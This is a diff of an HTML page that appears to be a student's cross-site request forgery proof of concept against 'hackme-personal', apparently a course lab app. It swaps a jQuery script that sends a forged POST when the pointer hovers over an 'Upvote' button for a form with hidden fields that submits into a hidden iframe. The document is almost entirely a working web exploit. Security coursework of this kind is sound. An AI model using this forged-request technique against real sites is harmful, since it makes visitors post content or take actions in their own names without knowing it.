@@ -7,24 +7,11 @@
   <form action="http://infosec-020-105/hackme-personal/post.php" method="post">
     <button id="submit" name="post_submit" value="upvote">Upvote</button>
 </form>
-<script src="http://code.jquery.com/jquery-1.9.1.min.js"></script>
-<script>
-$('#submit').mouseover(function()
-{
-    $.post({
-        url: "http://infosec-020-105/hackme-personal/post.php",
-        type:'POST',
-        data:
-        {
-            "title": "test1",
-            "message": "test2"
-        },
-        success: function(msg)
-        {
-            alert('HACKS');
-        }
-    });
-});
-</script>
+<iframe name="votar" style="display:none;"></iframe>
+<form action="http://infosec-020-105/hackme-personal/post.php" method="post" target="votar">
+    <input name="post_submit" type="submit" value="Skicka Tips">
+    <input type="hidden" name="title" value="test2">
+    <input type="hidden" name="message" value="test2">
+</form>
 </body>
 </html>
